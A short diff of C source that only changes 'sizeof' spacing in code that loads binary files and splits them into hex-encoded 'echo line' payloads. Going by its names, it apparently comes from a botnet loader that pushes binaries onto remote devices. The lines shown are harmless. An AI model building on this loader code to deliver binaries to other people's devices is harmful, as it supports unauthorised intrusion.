@@ -24,8 +24,8 @@ BOOL binary_init(void)
         char file_name[256];
         struct binary *bin;
 
-        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
-        bin_list[bin_list_len] = calloc(1, sizeof (struct binary));
+        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof(struct binary *));
+        bin_list[bin_list_len] = calloc(1, sizeof(struct binary));
         bin = bin_list[bin_list_len++];
 
 #ifdef DEBUG
@@ -66,13 +66,13 @@ static BOOL load(struct binary *bin, char *fname)
         return FALSE;
     }
 
-    while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
+    while ((n = fread(rdbuf, sizeof(char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
     {
         char *ptr;
         int i;
 
-        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
-        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
+        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof(char *));
+        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof(char), (4 * n) + 8);
         ptr = bin->hex_payloads[bin->hex_payloads_len++];
 
         for (i = 0; i < n; i++)
